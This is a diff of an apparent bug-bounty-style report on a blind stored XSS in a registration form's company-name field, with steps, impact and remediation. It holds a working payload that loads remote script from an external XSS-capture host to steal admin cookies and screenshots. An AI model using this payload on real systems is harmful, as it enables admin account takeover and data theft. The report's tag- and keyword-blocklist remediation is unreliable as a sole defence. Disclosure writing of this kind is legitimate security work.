@@ -1,21 +1,20 @@
----
+
 ## Title
 Blind Cross-Site Scripting (XSS) via Company Name Field in Registration
 
----
 ## Vulnerability Type
 Blind XSS
 
----
+
 ## Summary
 I identified a blind XSS in the **company Name Feild** during user registration. The feild accepts and stores raw HTML without any sanitization. The payload does not executes on the user side - it fires silently in the admin panel when an admin views the registered users list.This was confirmed via XSS report which captured a screenshot of the admin panel where the payload executed.
 
----
+
 ## Vulnerable Endpoint
 ```
 http://kzlabs.com/63.php?view=register
 ```
----
+
 ## Steps to Reproduce
 1. Register a new account in the following URL
 ```
@@ -31,13 +30,13 @@ http://kzlabs.com/63.php?view=register
 7. Once the admin visits the dashboard the payload fires on their end and the XSS reporting tool at `xss.report` captures the execution along with a screenshot of what the admin viewd.
 8. The XSS report dashboard captured a screenshot of the admin panel confirming execution
 
----
+
 ## Payload Used
 ```
 '"><script src=https://xss.report/c/tali></script>
 ```
 
----
+
 ## Proof of Concept
 
 **Screenshot 1** — Registration form showing the blind XSS payload entered in the Company Name field, with the app itself warning "This field accepts any input including HTML content" confirming the field accepts raw HTML with no filtering at all.
@@ -62,7 +61,7 @@ http://kzlabs.com/63.php?view=register
 
 
 
----
+
 ## Impact
 - The payload executes silently in the admin browser with zero interaction-just by opening the dashboard and viewing recent registrations 
 - Admin session cookie is exposed - attacker can take over the admin account completly with no password needed.
@@ -70,7 +69,7 @@ http://kzlabs.com/63.php?view=register
 - The attacker also gets a screenshot of exactly what the admin sees leaking sensitive internal data like user emails, registration details and platform stats
 - The victim admin has no idea anything happened - the page look completely normal.
 
----
+
 ## Remediation
 1. Filter out dangerous HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
 2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
